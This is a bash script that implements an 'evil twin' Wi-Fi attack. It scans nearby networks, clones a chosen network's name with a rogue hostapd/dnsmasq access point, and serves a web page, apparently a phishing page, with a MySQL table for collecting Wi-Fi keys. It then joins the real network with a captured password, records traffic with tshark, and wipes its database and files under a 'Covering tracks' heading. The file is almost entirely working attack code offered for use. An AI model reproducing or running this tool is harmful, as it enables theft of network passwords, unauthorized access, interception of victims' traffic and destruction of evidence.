#!/bin/bash


user=$(whoami)
#network
wireless_interface_name=$(iwconfig 2> /dev/null | grep "IEEE" | cut -d " " -f 1)
wifi_networks_scanner=$(iwlist $wireless_interface_name scan 2> /dev/null| grep "ESSID"| cut -d '"' -f 2)

#mysql variables
dbname=access_point
tablename=wifi_keys
username=AP
userpasswd=password

#colors
RED="\033[0;31m"

## Privilege check
if [ $user = root ]; then
	echo "[*] You are root"
else
	echo -e "${RED}[-] Run script as root"
	exit 0
fi

if [ -f "db_conf.sh" ]; then
	path_to_file=$(pwd)
else
	echo "[-] Could find db_conf.sh file"
	exit 1
fi

## Preparation for future
function Preparation()
{
	output=$(iwconfig 2> /dev/null)	
	if 
		echo $output | grep -q '802.11'; then
			echo "[*] Wlan interface is up"
	else
		echo "[-] Error. Wlan interface doesn't exist"
		exit 0
	fi
}


## Wifi network scan and comparison
function Wifi_networks_scan()
{
	Current_connected_net=$(iwconfig 2> /dev/null | awk '/ESSID/ {print}' | cut -d '"' -f 2)
	declare -a networks_list=($wifi_networks_scanner)
	length=${#networks_list[@]}

	echo "[*] Choose target network:" 
	echo '**********************************************************'
	for (( number=0; number<length; number++ ));
	do
		echo "[$number]" "${networks_list[$number]}"
	done

	echo '**********************************************************'

	while true; do
	read -p "[?] Enter network you want to clone: " selected_network
	if [ $selected_network = $Current_connected_net ]; then
		echo "[-] Error. You are connected to the same network"
		echo "[-] Please choose other one"
	else
		if [[ "$wifi_networks_scanner" == *"$selected_network"* ]]; then 
			echo "[*] You selected - $selected_network, proceeding..."
			break
		else
			echo "[-] $selected_network doesn't exist"
		fi
	fi
	done

} 


## Setting up an access point
function AP_set_up()
{	
	echo "[*] Putting device in monitor mode..."
	airmon-ng start $wireless_interface_name > /dev/null
	
	monitor_mode=$(iwconfig 2> /dev/null | grep "IEEE" | cut -d " " -f 1)

	echo "[*] Creating directory in /root/access_point"
	mkdir /root/access_point

	echo "[*] Creating hostapd.conf file"
	echo "interface=$monitor_mode
driver=nl80211
ssid=$selected_network
hw_mode=g
channel=7
macaddr_acl=0
ignore_broadcast_ssid=0" > /root/access_point/hostapd.conf
	sleep 1

	echo "[*] Creating dnsmasq.conf file"
	echo "interface=$monitor_mode
dhcp-range=192.168.0.2,192.168.0.30,255.255.255.0,12h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1" > /root/access_point/dnsmasq.conf
	sleep 2
	
	hostapd hostapd.conf

	ifconfig $monitor_mode up 192.168.0.1 netmask 255.255.255.0
	route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1


	dnsmasq -C dnsmasq.conf -d 
	
	echo "[*] Unzipping files to /var/www/html"
	rm -rf /var/www/html/*
	mv file.zip /root/access_point
	unzip /root/access_point/file.zip -d /var/www/html
	sleep 2

	service apache2 start
	service mysql start
	
	source db_conf.sh

}

## Network reconnaissance and traffic dump
function network_recon()
{
	airmon-ng stop $monitor_mode
	if [ $password1 = $password2 ]; then
		nmcli d wifi connect "$selected_network" password $password1 ifname $wireless_interface_name
	else
		if [ nmcli d wifi connect "$selected_network" password $password1 ifname $wireless_interface_name == "Error: 802-11-wireless-security.psk: property is invalid." ]; then
			nmcli d wifi connect "$selected_network" password $password2 ifname $wireless_interface_name
		fi
	fi
	sleep 5
	tshark -w /tmp/capture.pcap -a duration:30
}


## Covering tracks
function delete()
{	
	echo '[*] Deleting mysql user..'
	sleep 2
	mysql -e "DROP USER '${username}'@'localhost';"
	echo "[*] Deleting database..."
	sleep 2
	mysql -e "DROP DATABASE ${dbname};"
	service apache2 stop
	service mysql stop
	rm -rf /var/www/html/*
	rm -rf /root/access_point

}


## Final funtion
function pwn()
{
	Preparation
	Wifi_networks_scan
	AP_set_up
	network_recon
	delete
}

pwn